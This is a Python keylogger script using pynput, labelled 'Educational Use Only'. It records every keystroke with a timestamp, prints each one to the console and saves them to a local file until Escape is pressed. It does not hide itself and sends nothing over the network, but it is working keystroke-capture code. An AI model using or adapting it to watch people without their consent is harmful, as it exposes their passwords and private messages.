from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "keylog.txt"


def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def write_to_log(text: str):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")


def on_press(key):
    try:
        entry = f"[{get_timestamp()}] Key: {key.char}"
    except AttributeError:
        entry = f"[{get_timestamp()}] Special Key: {key}"

    print(entry)
    write_to_log(entry)


def on_release(key):
    if key == keyboard.Key.esc:
        print(f"\n[{get_timestamp()}] Keylogger stopped by user (Escape pressed).")
        write_to_log(f"[{get_timestamp()}] --- Session ended ---\n")
        return False


def main():
    print("=" * 50)
    print("  Simple Keylogger - Educational Use Only")
    print("  Press ESC to stop.")
    print(f"  Logging keystrokes to: {os.path.abspath(LOG_FILE)}")
    print("=" * 50)

    write_to_log(f"\n[{get_timestamp()}] --- Session started ---")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
